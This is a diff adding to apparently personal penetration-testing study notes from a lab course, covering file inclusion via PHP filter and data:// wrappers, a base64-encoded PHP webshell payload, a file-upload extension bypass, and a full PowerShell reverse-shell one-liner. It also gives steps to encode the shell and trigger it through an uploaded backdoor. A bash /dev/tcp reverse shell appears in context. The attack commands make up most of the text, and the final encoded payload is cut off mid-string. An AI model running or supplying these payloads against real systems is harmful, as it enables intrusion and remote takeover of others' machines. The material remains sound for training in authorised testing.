@@ -381,5 +381,89 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 Outside PHP, we can also leverage LFI and RFI vulnerabilities in other frameworks or server-side scripting languages including Perl,11 Active Server Pages Extended,12 Active Server Pages,13 and Java Server Pages
 ```
 
+to check sudo privileges
+```
+sudo -l
+```
+
+### PHP Wrappers
+
+can use a wrapper to see php source code.  often times anything with <?php> tags will get executed by the server. so we want the source code sent base64 encoded so that backend templating languages won't execute it.
+
+#### php://filter 
+basic filter -- won't always work for reasons above
+
+```
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+```
+
+base64 encoded option works better
+```
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+echo -n $result | base64 -d
+```
+#### data://
+let's us execute plain text. although sometimes firewalls will filter out php snippets so we need to encode
+
+```
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+```
+
+base64 encoded version 
+
+```
+echo -n echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+```
+
+### RFI
+
+`/usr/share/webshells/php/simple-backdoor.php` simple php webshell
+
+start a python web server
+
+```
+python3 -m http.server 8080
+```
+
+## File Uploads
+### Executable File Upload
+
+can sometimes fool extension checker by using capital letters -> script.PhP
+
+Powershell one liner for reverse shell
+
+```
+New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+```
+
+Sequence for powershell reverse shell
+1. open up pwsh
+2. copy the one liner
+3. encode the line
+4. send it via curl
+
+```
+pwsh
+
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+
+exit
+```
+
+powershell needs an enc parameter to specify encoding
+
+```
+curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB
+```
+
+
+
+
+
 
 
